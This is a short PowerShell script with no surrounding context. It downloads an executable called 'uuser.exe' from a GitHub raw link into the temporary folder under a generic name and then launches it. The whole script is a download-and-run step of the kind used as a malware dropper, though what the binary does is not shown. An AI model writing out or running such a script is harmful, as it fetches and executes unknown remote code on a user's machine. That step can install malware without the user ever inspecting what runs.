$exeUrl = "https://github.com/Noplez/ROLE/raw/refs/heads/main/uuser.exe"

$tempPath = "$env:TEMP\downloaded_file.exe"

Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath

Start-Process -FilePath $tempPath -Wait
